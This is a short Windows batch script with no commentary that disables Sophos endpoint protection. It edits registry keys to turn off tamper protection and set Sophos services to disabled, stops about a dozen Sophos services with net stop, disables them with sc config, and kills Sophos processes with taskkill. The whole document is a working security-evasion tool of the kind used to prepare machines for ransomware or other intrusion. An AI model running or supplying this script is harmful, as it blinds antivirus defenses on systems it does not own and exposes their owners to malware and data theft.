REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SAVService" /t REG_DWORD /v Start /d 0x00000004 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos MCS Agent" /t REG_DWORD /v Start /d 0x00000004 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Config" /t REG_DWORD /v SAVEnabled /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sophos Endpoint Defense\TamperProtection\Config" /t REG_DWORD /v SEDEnabled /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Sophos\SAVService\TamperProtection" /t REG_DWORD /v Enabled /d 0 /f

start net stop "SAVAdminService"
start net stop "SAVService"
start net stop "Sophos Agent"
start net stop "Sophos AutoUpdate Service"
start net stop "Sophos Device Control Service"
start net stop "Sophos Endpoint Defense Service"
start net stop "Sophos Message Router"
start net stop "Sophos System Protection Service"
start net stop "Sophos Web Control Service"
start net stop "swi_service"
start net stop "swi_update_64"
start net stop "swi_filter"

start sc config "SAVAdminService" start= disabled
start sc config "SAVService" start= disabled
start sc config "Sophos Agent" start= disabled
start sc config "Sophos AutoUpdate Service" start= disabled
start sc config "Sophos Device Control Service" start= disabled
start sc config "Sophos Endpoint Defense Service" start= disabled
start sc config "Sophos Message Router" start= disabled
start sc config "Sophos System Protection Service" start= disabled
start sc config "Sophos Web Control Service" start= disabled
start sc config "swi_service" start= disabled
start sc config "swi_update_64" start= disabled
start sc config "swi_filter" start= disabled

start taskkill /im ALMon.exe /f
start taskkill /im swc_service.exe /f
start taskkill /im swi_fc.exe /f
start taskkill /im swi_filter.exe /f